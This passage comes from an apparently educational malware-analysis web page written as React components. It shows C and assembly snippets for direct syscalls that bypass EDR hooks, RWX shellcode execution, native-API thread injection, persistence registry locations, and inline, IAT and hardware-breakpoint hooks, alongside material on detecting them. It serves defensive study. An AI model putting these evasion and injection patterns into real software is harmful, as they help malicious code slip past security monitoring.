                    <CodeBlock title="Direct Syscall Techniques">{`// Method 1: Hardcoded syscall stub (version-specific)
// DANGEROUS: Syscall numbers change between Windows versions!
__asm {
    mov r10, rcx
    mov eax, 0x18          ; NtAllocateVirtualMemory on some versions
    syscall
    ret
}

// Method 2: Read syscall number from ntdll (safer)
DWORD GetSyscallNumber(const char* funcName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC func = GetProcAddress(ntdll, funcName);
    if (!func) return 0;
    
    // Syscall stub: mov r10, rcx; mov eax, <num>; syscall
    // Bytes:        4C 8B D1      B8 XX XX XX XX  0F 05
    BYTE* code = (BYTE*)func;
    if (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 &&
        code[3] == 0xB8) {
        return *(DWORD*)(code + 4);  // Extract syscall number
    }
    return 0;  // Hooked or unexpected pattern
}

// Method 3: SysWhispers-style (generate syscall stubs)
// Uses MASM to create direct syscall functions
// https://github.com/jthuraisamy/SysWhispers2

// Method 4: Hell's Gate (runtime syscall resolution)
// Walks ntdll export table, finds clean syscall stubs
// Works even when ntdll is hooked (reads from other copies)
// https://github.com/am0nsec/HellsGate

// Example: Direct NtAllocateVirtualMemory
NTSTATUS NTAPI DirectNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Assembly implementation (MASM syntax):
DirectNtAllocateVirtualMemory PROC
    mov r10, rcx              ; ProcessHandle
    mov eax, syscall_number   ; Resolved at runtime
    syscall
    ret
DirectNtAllocateVirtualMemory ENDP`}</CodeBlock>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Syscall Evasion Techniques</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Grid container spacing={2} sx={{ mb: 2 }}>
                      {[
                        { name: "Hell's Gate", desc: "Dynamically resolve syscall numbers by walking ntdll exports", bypass: "Reads syscall # from memory", detection: "Medium" },
                        { name: "Halo's Gate", desc: "If function is hooked, search nearby functions for clean stubs", bypass: "Falls back to neighbors", detection: "Medium" },
                        { name: "Tartarus' Gate", desc: "Search for syscall instruction in ntdll, calculate number from offset", bypass: "Pattern matching", detection: "Medium-Hard" },
                        { name: "SysWhispers", desc: "Generate syscall stubs at compile time with version detection", bypass: "No ntdll dependency", detection: "Hard" },
                        { name: "Fresh Copy", desc: "Read clean ntdll from disk or KnownDlls section", bypass: "Avoids in-memory hooks", detection: "Medium" },
                        { name: "Manual Mapping", desc: "Manually map ntdll to new location, use that copy", bypass: "Complete hook bypass", detection: "Hard" },
                      ].map((tech) => (
                        <Grid item xs={12} md={6} key={tech.name}>
                          <Card variant="outlined">
                            <CardContent>
                              <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                                <Typography variant="subtitle1" fontWeight="bold" color="primary">{tech.name}</Typography>
                                <Chip label={`Detection: ${tech.detection}`} size="small" variant="outlined" 
                                  color={tech.detection === "Hard" ? "success" : tech.detection === "Medium-Hard" ? "warning" : "default"} />
                              </Box>
                              <Typography variant="body2" paragraph>{tech.desc}</Typography>
                              <Typography variant="caption" color="text.secondary">{tech.bypass}</Typography>
                            </CardContent>
                          </Card>
                        </Grid>
                      ))}
                    </Grid>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Detecting Hooked Functions</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <CodeBlock title="Hook Detection Techniques">{`// Detect inline hooks (JMP/CALL at function start)
BOOL IsHooked(FARPROC funcAddr) {
    BYTE* code = (BYTE*)funcAddr;
    
    // Check for JMP (E9) or CALL (E8) at start
    if (code[0] == 0xE9 || code[0] == 0xE8) {
        return TRUE;  // Inline hook
    }
    
    // Check for MOV RAX, addr; JMP RAX pattern
    if (code[0] == 0x48 && code[1] == 0xB8) {
        // 48 B8 XX XX XX XX XX XX XX XX = mov rax, imm64
        if (code[10] == 0xFF && code[11] == 0xE0) {
            return TRUE;  // JMP RAX
        }
    }
    
    // Expected ntdll syscall stub start:
    // 4C 8B D1 = mov r10, rcx
    // B8 XX XX XX XX = mov eax, syscall#
    if (code[0] != 0x4C || code[1] != 0x8B || code[2] != 0xD1) {
        return TRUE;  // Not expected pattern = hooked
    }
    
    return FALSE;
}

// Compare with disk copy to detect patches
BOOL CompareWithDisk(const char* funcName) {
    // Read ntdll from disk
    HANDLE hFile = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    // Map file, find export, compare bytes...
    // If different = hooked
}

// Example output of hook scanner:
// ntdll.dll!NtAllocateVirtualMemory - CLEAN
// ntdll.dll!NtCreateThreadEx - HOOKED (JMP detected)
// ntdll.dll!NtWriteVirtualMemory - HOOKED (bytes modified)`}</CodeBlock>
                  </AccordionDetails>
                </Accordion>

                <Accordion>
                  <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                    <Typography fontWeight="bold">Syscall Resources & Tools</Typography>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Grid container spacing={2}>
                      {[
                        { name: "SysWhispers2/3", desc: "Generate direct syscall stubs for your project", url: "github.com/jthuraisamy/SysWhispers2" },
                        { name: "Hell's Gate", desc: "Runtime syscall number resolution", url: "github.com/am0nsec/HellsGate" },
                        { name: "SyscallTables", desc: "Complete Windows syscall number database", url: "github.com/j00ru/windows-syscalls" },
                        { name: "ntdll-sys", desc: "Rust bindings for Windows syscalls", url: "crates.io/crates/ntapi" },
                        { name: "InlineWhispers", desc: "Inline assembly syscalls for C/C++", url: "github.com/outflanknl/InlineWhispers" },
                        { name: "SharpWhispers", desc: "Direct syscalls for .NET", url: "github.com/jthuraisamy/SharpWhispers" },
                      ].map((tool) => (
                        <Grid item xs={12} md={6} key={tool.name}>
                          <Card variant="outlined">
                            <CardContent>
                              <Typography variant="subtitle1" fontWeight="bold" color="primary">{tool.name}</Typography>
                              <Typography variant="body2">{tool.desc}</Typography>
                              <Typography variant="caption" color="text.secondary">{tool.url}</Typography>
                            </CardContent>
                          </Card>
                        </Grid>
                      ))}
                    </Grid>
                  </AccordionDetails>
                </Accordion>
              </Paper>
            </Box>

            {/* Section: API Patterns */}
            <Box id="api-patterns" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
            <Typography variant="h5" gutterBottom fontWeight="bold">Windows API Patterns</Typography>
            
            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              One of the most powerful techniques in malware analysis is <strong>behavioral pattern recognition</strong> — 
              identifying sequences of Windows API calls that, when combined, indicate specific malicious activities. While a 
              single call to <code>VirtualAlloc</code> is innocuous (programs allocate memory constantly), the combination of 
              <code>VirtualAlloc</code> with <code>PAGE_EXECUTE_READWRITE</code> permissions, followed by memory copying and 
              thread creation, is a classic shellcode execution pattern that should immediately raise red flags. Developing 
              an intuition for these patterns is essential for efficient triage and deep-dive analysis.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The Windows API is vast, encompassing thousands of functions across dozens of DLLs. For malware analysis, we 
              can categorize APIs by their potential for abuse. <strong>Process manipulation APIs</strong> like <code>OpenProcess</code>, 
              <code>CreateRemoteThread</code>, and <code>NtCreateThreadEx</code> enable code execution in other processes — a 
              fundamental capability for injection attacks. <strong>Memory APIs</strong> like <code>VirtualAllocEx</code>, 
              <code>WriteProcessMemory</code>, and <code>NtMapViewOfSection</code> allow reading and writing another process's 
              memory. <strong>Persistence APIs</strong> involve registry manipulation (RegSetValueEx with Run keys), service 
              creation (CreateService), scheduled task creation, or WMI subscriptions. Each category has characteristic patterns 
              that analysts learn to recognize.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Dynamic API resolution</strong> is another critical pattern. Malware frequently avoids static imports 
              (which appear in the PE import table and can be easily analyzed) by resolving function addresses at runtime 
              using <code>GetProcAddress</code> or by directly walking the PEB's loaded module list and parsing export tables. 
              Some malware goes further, using hash-based API resolution where function names are pre-computed hashes, making 
              static analysis even more difficult. When you see calls to <code>GetModuleHandle</code> followed by 
              <code>GetProcAddress</code>, or direct PEB manipulation to find DLL bases, the program is likely trying to hide 
              its true capabilities from static analysis tools.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              Understanding API <strong>call flows</strong> is equally important. Legitimate programs typically follow predictable 
              patterns: open file, read file, close file. Malware often exhibits anomalous patterns: allocate memory, copy 
              encrypted data, decrypt in place, execute. Process injection follows a predictable flow: open target process, 
              allocate memory in target, write payload to target, trigger execution (via remote thread, APC, or other technique). 
              Process hollowing has its own signature: create suspended process, unmap original image, write new image, resume. 
              Learning these flows helps you quickly categorize and understand unknown samples.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
              The transition to <strong>Native API</strong> usage (Nt* and Zw* functions) is a significant indicator of 
              sophistication. While legitimate software occasionally uses native APIs for functionality not exposed through 
              Win32, heavy reliance on ntdll functions — especially combined with direct syscalls — suggests deliberate 
              attempts to evade security monitoring. Tools like API Monitor, Process Monitor, and ETW-based solutions are 
              essential for observing these patterns in action during dynamic analysis. Combining static import analysis with 
              dynamic API monitoring gives you the complete picture of a sample's behavior.
            </Typography>

            <Alert severity="error" sx={{ mb: 3 }}>
              <AlertTitle>High-Risk API Combinations</AlertTitle>
              <List dense>
                <ListItem><ListItemIcon><WarningIcon color="error" /></ListItemIcon><ListItemText primary="VirtualAlloc(RWX) + memcpy + CreateThread = Shellcode execution" /></ListItem>
                <ListItem><ListItemIcon><WarningIcon color="error" /></ListItemIcon><ListItemText primary="OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread = Process injection" /></ListItem>
                <ListItem><ListItemIcon><WarningIcon color="error" /></ListItemIcon><ListItemText primary="CreateProcess(SUSPENDED) + NtUnmapViewOfSection + WriteProcessMemory = Process hollowing" /></ListItem>
                <ListItem><ListItemIcon><WarningIcon color="error" /></ListItemIcon><ListItemText primary="Heavy Nt*/Zw* native API usage = Attempting to bypass usermode hooks" /></ListItem>
              </List>
            </Alert>

            {suspiciousImports.map((cat) => (
              <Accordion key={cat.category} defaultExpanded={cat.severity === "high"}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                    <Typography fontWeight="bold">{cat.category}</Typography>
                    <Chip 
                      label={cat.severity?.toUpperCase() || "MEDIUM"} 
                      size="small" 
                      color={cat.severity === "high" ? "error" : cat.severity === "medium" ? "warning" : "default"}
                    />
                  </Box>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography paragraph variant="body2" color="text.secondary">{cat.description}</Typography>
                  <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1 }}>
                    {cat.apis.map((api) => (
                      <Chip key={api} label={api} size="small" variant="outlined" sx={{ fontFamily: "monospace", fontSize: "0.75rem" }} />
                    ))}
                  </Box>
                </AccordionDetails>
              </Accordion>
            ))}

            <Divider sx={{ my: 3 }} />
            <Typography variant="h6" gutterBottom fontWeight="bold">Common Malware Patterns with Code</Typography>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Shellcode Execution Pattern</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="Allocate + Copy + Execute">{`// Pattern 1: VirtualAlloc with RWX (most suspicious)
LPVOID mem = VirtualAlloc(NULL, shellcodeSize, 
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(mem, shellcode, shellcodeSize);
((void(*)())mem)();  // Direct execution

// Pattern 2: Two-stage (RW then RX) - slightly stealthier
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
memcpy(mem, shellcode, size);
DWORD oldProtect;
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &oldProtect);
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

// Pattern 3: Heap execution (if DEP is disabled)
HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
LPVOID mem = HeapAlloc(heap, 0, size);
memcpy(mem, shellcode, size);
((void(*)())mem)();`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Dynamic API Resolution</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Typography paragraph>
                  Malware often resolves APIs at runtime to avoid static import table analysis and evade signature detection.
                </Typography>
                <CodeBlock title="GetProcAddress / LdrGetProcedureAddress">{`// Standard dynamic resolution
typedef BOOL (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);

HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddress(
    hKernel32, "VirtualProtect");
fnVirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);

// Using hashes to avoid strings (common in shellcode)
#define HASH_VirtualProtect 0x7946c61b  // pre-computed hash
FARPROC ResolveApiByHash(HMODULE hModule, DWORD hash) {
    // Walk EAT, hash each export name, compare
}

// Native API resolution (bypasses usermode hooks on kernel32)
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(...);
pNtProtectVirtualMemory NtProtectVirtualMemory = 
    (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Persistence Mechanisms</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Grid container spacing={2}>
                  {[
                    { name: "Run Keys", reg: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", desc: "Executes on user logon" },
                    { name: "Services", reg: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\<name>", desc: "Runs as SYSTEM service" },
                    { name: "Scheduled Tasks", reg: "schtasks /create or Task Scheduler API", desc: "Runs on schedule or event" },
                    { name: "COM Hijacking", reg: "HKCU\\Software\\Classes\\CLSID\\{...}", desc: "DLL loaded when COM object created" },
                    { name: "AppInit_DLLs", reg: "HKLM\\..\\Windows\\CurrentVersion\\Windows\\AppInit_DLLs", desc: "Loaded into all GUI apps" },
                    { name: "WMI Subscription", reg: "WMI EventConsumer + EventFilter + Binding", desc: "Fileless persistence" },
                  ].map((p) => (
                    <Grid item xs={12} md={6} key={p.name}>
                      <Card variant="outlined">
                        <CardContent>
                          <Typography variant="subtitle2" fontWeight="bold" color="primary">{p.name}</Typography>
                          <Typography variant="caption" sx={{ fontFamily: "monospace", display: "block", mb: 1 }}>{p.reg}</Typography>
                          <Typography variant="body2" color="text.secondary">{p.desc}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                  ))}
                </Grid>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Native API (Nt*/Zw*) Patterns</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <Alert severity="info" sx={{ mb: 2 }}>
                  <AlertTitle>Why Use Native APIs?</AlertTitle>
                  Native APIs (Nt* functions in ntdll.dll) are the true system call interface.
                  Malware uses them to bypass usermode hooks placed by security products on Win32 APIs.
                </Alert>
                <CodeBlock title="Native API Examples">{`// Memory allocation without VirtualAlloc hooks
PVOID baseAddr = NULL;
SIZE_T regionSize = 0x1000;
NTSTATUS status = NtAllocateVirtualMemory(
    NtCurrentProcess(),  // or GetCurrentProcess()
    &baseAddr,
    0,
    &regionSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

// Create remote thread without CreateRemoteThread hooks
HANDLE hThread;
NtCreateThreadEx(
    &hThread,
    THREAD_ALL_ACCESS,
    NULL,
    hProcess,
    (LPTHREAD_START_ROUTINE)remoteAddr,
    NULL,
    0,  // flags (THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER = 4)
    0, 0, 0,
    NULL
);

// Direct syscall (ultimate evasion - bypasses ntdll hooks too)
// Requires knowing the syscall number (changes per Windows version)
mov r10, rcx
mov eax, 0x18  ; NtAllocateVirtualMemory syscall number (varies!)
syscall
ret`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
              </Paper>
            </Box>

            {/* Section: Hooking */}
            <Box id="hooking" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
            <Typography variant="h5" gutterBottom fontWeight="bold">Hooking Techniques</Typography>
            
            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Hooking</strong> is the practice of intercepting function calls, system events, or messages to observe, 
              modify, or redirect their behavior. This powerful technique sits at the heart of many security technologies and 
              is equally essential for both attackers and defenders. Antivirus and EDR products hook Windows APIs to monitor 
              for malicious activity; debuggers hook to enable breakpoints and tracing; rootkits hook to hide their presence; 
              and game cheats hook to modify game behavior. For reverse engineers, understanding hooking is essential both 
              for implementing analysis tools and for detecting when software is being monitored or tampered with.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              Hooks can be categorized by their mechanism. <strong>Code modification hooks</strong> physically alter the target 
              code or data structures. Import Address Table (IAT) hooks replace function pointers in a module's import table, 
              so calls to imported functions are redirected. Export Address Table (EAT) hooks modify the export table so that 
              modules importing from the hooked DLL get redirected addresses. Inline hooks (also called detours or trampolines) 
              patch the first bytes of the target function itself, inserting a jump to the hook handler. These are the most 
              common techniques and are used extensively by both security software and malware.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Exception-based hooks</strong> use the CPU's debugging and exception mechanisms rather than modifying code. 
              Hardware breakpoints use the CPU's debug registers (DR0-DR7) to trigger exceptions when specific addresses are 
              executed, read, or written — these are completely invisible to code inspection since no bytes are modified. 
              Vectored Exception Handlers (VEH) can catch these exceptions before structured exception handling, enabling 
              powerful hooking frameworks. Page guard hooks use the PAGE_GUARD memory protection flag to trigger a one-shot 
              exception when a page is first accessed. These techniques are stealthier than code modification but have limitations 
              (hardware breakpoints are limited to 4 addresses; page guards can only trigger once per page).
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              At the <strong>kernel level</strong>, hooks become even more powerful but require elevated privileges. System 
              Service Descriptor Table (SSDT) hooks intercept system calls before they reach the kernel, though this technique 
              is largely blocked by Kernel Patch Protection (PatchGuard) on modern 64-bit Windows. Filter drivers (minifilters 
              for file system, network filter drivers, etc.) provide Microsoft-sanctioned ways to intercept I/O operations. 
              IRP hooks intercept driver communications. Callback mechanisms like PsSetCreateProcessNotifyRoutine provide 
              official ways to monitor process creation. EDR vendors combine usermode hooks with kernel callbacks for 
              comprehensive coverage.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8, mb: 3 }}>
              <strong>Detecting hooks</strong> is an important skill for malware analysis. Code modification hooks can be 
              detected by comparing in-memory code against the original on-disk bytes — any discrepancy indicates modification. 
              The first bytes of commonly hooked functions (like NtAllocateVirtualMemory in ntdll) can be checked for JMP or 
              CALL instructions that shouldn't be there. Hardware breakpoints can be detected by reading the debug registers 
              via GetThreadContext. Advanced malware scans for hooks as part of its anti-analysis routines, and sophisticated 
              techniques exist to bypass detected hooks (reading clean ntdll from disk, manual mapping, direct syscalls).
            </Typography>

            <Alert severity="info" sx={{ mb: 3 }}>
              <AlertTitle>Hook Types Overview</AlertTitle>
              <Grid container spacing={2}>
                <Grid item xs={12} md={4}>
                  <Typography variant="subtitle2" fontWeight="bold">Code Modification</Typography>
                  <Typography variant="body2">IAT, EAT, Inline hooks modify code/data — detectable by byte comparison</Typography>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Typography variant="subtitle2" fontWeight="bold">Exception-Based</Typography>
                  <Typography variant="body2">Hardware BP, VEH, Page Guard use exceptions — stealthier but limited</Typography>
                </Grid>
                <Grid item xs={12} md={4}>
                  <Typography variant="subtitle2" fontWeight="bold">Kernel-Level</Typography>
                  <Typography variant="body2">SSDT, IRP, Filter drivers intercept at kernel — requires privilege</Typography>
                </Grid>
              </Grid>
            </Alert>

            {hookingTechniques.map((hook) => (
              <Accordion key={hook.name}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography fontWeight="bold">{hook.name}</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography paragraph>{hook.description}</Typography>
                  <Grid container spacing={2}>
                    <Grid item xs={12} md={6}>
                      <Card variant="outlined">
                        <CardContent>
                          <Typography variant="subtitle2" fontWeight="bold" color="primary">Implementation</Typography>
                          <Typography variant="body2">{hook.implementation}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Card variant="outlined">
                        <CardContent>
                          <Typography variant="subtitle2" fontWeight="bold" color="error">Detection</Typography>
                          <Typography variant="body2">{hook.detection}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Card variant="outlined">
                        <CardContent>
                          <Typography variant="subtitle2" fontWeight="bold" color="success.main">Pros</Typography>
                          <Typography variant="body2">{hook.pros}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                    <Grid item xs={12} md={6}>
                      <Card variant="outlined">
                        <CardContent>
                          <Typography variant="subtitle2" fontWeight="bold" color="warning.main">Cons</Typography>
                          <Typography variant="body2">{hook.cons}</Typography>
                        </CardContent>
                      </Card>
                    </Grid>
                  </Grid>
                </AccordionDetails>
              </Accordion>
            ))}

            <Divider sx={{ my: 3 }} />
            <Typography variant="h6" gutterBottom fontWeight="bold">Hook Implementation Examples</Typography>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Inline Hook (Detours) Implementation</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="32-bit Inline Hook">{`// Original function prologue (typical)
// 8B FF        mov edi, edi    ; 2 bytes (hot-patchable NOP)
// 55           push ebp        ; 1 byte
// 8B EC        mov ebp, esp    ; 2 bytes
// Total: 5 bytes - perfect for E9 JMP

// Hook structure
typedef struct _HOOK {
    LPVOID pTarget;       // Address of function to hook
    LPVOID pDetour;       // Address of our hook function
    LPVOID pTrampoline;   // Trampoline to call original
    BYTE   origBytes[16]; // Saved original bytes
    DWORD  bytesStolen;   // Number of bytes stolen
} HOOK;

// Install inline hook
BOOL InstallHook(HOOK* pHook) {
    // 1. Calculate relative offset for JMP
    DWORD relativeAddr = (DWORD)pHook->pDetour - (DWORD)pHook->pTarget - 5;
    
    // 2. Change protection to RWX
    DWORD oldProtect;
    VirtualProtect(pHook->pTarget, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // 3. Save original bytes
    memcpy(pHook->origBytes, pHook->pTarget, 5);
    
    // 4. Write JMP instruction (E9 = relative JMP)
    *(BYTE*)pHook->pTarget = 0xE9;
    *(DWORD*)((BYTE*)pHook->pTarget + 1) = relativeAddr;
    
    // 5. Restore protection
    VirtualProtect(pHook->pTarget, 5, oldProtect, &oldProtect);
    
    // 6. Create trampoline (execute stolen bytes + JMP back)
    // [stolen bytes] + [JMP target+5]
    return TRUE;
}

// Hook function example (MessageBoxA hook)
int WINAPI HookedMessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
    printf("MessageBox intercepted: %s\\n", lpText);
    // Call original via trampoline
    return ((int(WINAPI*)(HWND,LPCSTR,LPCSTR,UINT))pHook->pTrampoline)(
        hWnd, "[HOOKED] ", lpCaption, uType);
}`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">IAT Hook Implementation</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="IAT Hooking">{`// Find IAT entry for a function and replace it
BOOL HookIAT(HMODULE hModule, LPCSTR szDllName, LPCSTR szFuncName, LPVOID pHook) {
    // Get PE headers
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDos->e_lfanew);
    
    // Get import directory
    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(
        (BYTE*)hModule + pNT->OptionalHeader.DataDirectory[1].VirtualAddress);
    
    // Walk import descriptors
    while (pImport->Name) {
        LPCSTR dllName = (LPCSTR)((BYTE*)hModule + pImport->Name);
        if (_stricmp(dllName, szDllName) == 0) {
            // Found DLL, walk thunks
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(
                (BYTE*)hModule + pImport->FirstThunk);  // IAT
            PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)(
                (BYTE*)hModule + pImport->OriginalFirstThunk);  // INT
            
            while (pOrigThunk->u1.AddressOfData) {
                if (!(pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(
                        (BYTE*)hModule + pOrigThunk->u1.AddressOfData);
                    if (strcmp((char*)pName->Name, szFuncName) == 0) {
                        // Found! Replace IAT entry
                        DWORD oldProtect;
                        VirtualProtect(&pThunk->u1.Function, sizeof(LPVOID), 
                            PAGE_EXECUTE_READWRITE, &oldProtect);
                        pThunk->u1.Function = (ULONG_PTR)pHook;
                        VirtualProtect(&pThunk->u1.Function, sizeof(LPVOID), 
                            oldProtect, &oldProtect);
                        return TRUE;
                    }
                }
                pThunk++;
                pOrigThunk++;
            }
        }
        pImport++;
    }
    return FALSE;
}

// Usage:
// HookIAT(GetModuleHandle(NULL), "USER32.dll", "MessageBoxA", MyMessageBox);`}</CodeBlock>
              </AccordionDetails>
            </Accordion>

            <Accordion>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Typography fontWeight="bold">Hardware Breakpoint Hook</Typography>
              </AccordionSummary>
              <AccordionDetails>
                <CodeBlock title="Hardware Breakpoint via Debug Registers">{`// Use debug registers DR0-DR3 for stealthy hooks
// No code modification - uses CPU hardware debugging features

BOOL SetHardwareBreakpoint(HANDLE hThread, LPVOID pAddress, int regIndex) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
    
    if (!GetThreadContext(hThread, &ctx))
        return FALSE;
    
    // Set address in DR0-DR3
    switch (regIndex) {
        case 0: ctx.Dr0 = (DWORD_PTR)pAddress; break;
        case 1: ctx.Dr1 = (DWORD_PTR)pAddress; break;
        case 2: ctx.Dr2 = (DWORD_PTR)pAddress; break;
        case 3: ctx.Dr3 = (DWORD_PTR)pAddress; break;
    }
    
    // Configure DR7 (debug control register)
    // Bits: L0-L3 (local enable), G0-G3 (global enable)
    // Condition: 00=execute, 01=write, 11=read/write
    // Length: 00=1byte, 01=2bytes, 11=4bytes
    ctx.Dr7 |= (1 << (regIndex * 2));  // Local enable
    ctx.Dr7 &= ~(3 << (16 + regIndex * 4));  // Condition: execute
    ctx.Dr7 &= ~(3 << (18 + regIndex * 4));  // Length: 1 byte
    
    return SetThreadContext(hThread, &ctx);
}

// VEH handler to catch the breakpoint
LONG CALLBACK VehHandler(PEXCEPTION_POINTERS pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Hardware breakpoint hit!
        PVOID addr = pExInfo->ExceptionRecord->ExceptionAddress;
        // ... handle hook logic ...
        
        // Clear DR6 status and resume
        pExInfo->ContextRecord->Dr6 = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Setup: AddVectoredExceptionHandler(1, VehHandler);`}</CodeBlock>
              </AccordionDetails>
            </Accordion>
              </Paper>
            </Box>

            {/* Section: Injection */}
            <Box id="injection" sx={{ mb: 5, scrollMarginTop: "180px" }}>
              <Paper sx={{ p: 4, borderRadius: 3 }}>
            <Typography variant="h5" gutterBottom fontWeight="bold">Code Injection Techniques</Typography>
            
            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              <strong>Code injection</strong> refers to a family of techniques that enable executing arbitrary code within 
              the address space of another process. This capability is one of the most critical concepts in both offensive 
              and defensive security. Malware uses injection to execute payloads in trusted processes (evading application 
              whitelisting), to gain access to sensitive data in other processes (credential theft), to hide malicious activity 
              behind legitimate process names (evasion), and to persist across process termination. Defensive tools use similar 
              techniques for monitoring and instrumentation. Every malware analyst and security researcher must deeply understand 
              these techniques to recognize them during analysis.
            </Typography>

            <Typography paragraph sx={{ fontSize: "1.05rem", lineHeight: 1.8 }}>
              The fundamental requirement for most injection techniques is the ability to manipulate another process's memory 
              and trigger code execution there. This typically involves three phases: <strong>opening the target process</strong> 
              with appropriate access rights (PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD), <strong>writing 
              code or data</strong> into the target's address space (via WriteProcessMemory or section mapping), and 
              <strong>triggering execution</strong> (via remote thread creation, APC queuing, context manipulation, or other 
              means). Different techniques vary in how they accomplish each phase, with more sophisticated techniques using 
